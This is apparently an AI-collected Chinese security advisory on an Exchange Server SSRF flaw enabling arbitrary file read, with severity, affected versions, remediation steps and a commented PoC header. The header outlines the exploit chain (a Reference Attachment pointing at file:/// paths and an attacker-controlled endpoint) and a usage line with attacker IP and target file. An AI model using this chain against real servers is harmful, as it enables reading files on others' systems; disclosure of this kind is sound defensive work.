**文章来源为：AI agent 自动采集整理**

**严重程度：** High
**CVSS：** 待评估（预估 7.5-8.5）
**影响版本：** Microsoft Exchange Server 2016 CU23 及更早版本
**公开日期：** 2026-06-24

### 漏洞描述
Microsoft Exchange Server 存在服务端请求伪造（SSRF）漏洞，经过认证的攻击者可通过 EWS 接口创建恶意引用附件（Reference Attachment），结合 OWA 的 GetAttachmentPreview 接口读取服务器上的任意文件。

### POC/利用
```python
# CVE-2026-45504 - Microsoft Exchange SSRF → Arbitrary File Read
# 作者: Batuhan Er @int20z (HawkTrace)
# 要求: 需要有效的 Exchange 域账号凭证
# 利用链:
# 1. OWA 登录获取 canary
# 2. EWS CreateItem 创建草稿邮件
# 3. EWS CreateAttachment 添加 Reference Attachment
#    - AttachLongPathName 指向 file:/// 目标文件路径
#    - ProviderEndpointUrl 指向攻击者 HTTP 服务器
# 4. OWA GetAttachmentPreview 触发 SSRF，返回文件内容
#
# 用法:
# python3 CVE-2026-45504.py --attacker-ip <IP> --attacker-port 9020 \
#   --creds <DOMAIN>\<USER> --password <PASS> \
#   --target https://exchange.target.local \
#   --target-file "C:/Windows/System32/drivers/etc/hosts"
#
# PoC 仓库: https://github.com/hawktrace/CVE-2026-45504
```

### 修复建议
1. 应用 Microsoft 官方安全更新
2. 监控 EWS 接口的异常 Reference Attachment 创建
3. 限制 OWA 的 GetAttachmentPreview 对 file:// 协议的访问
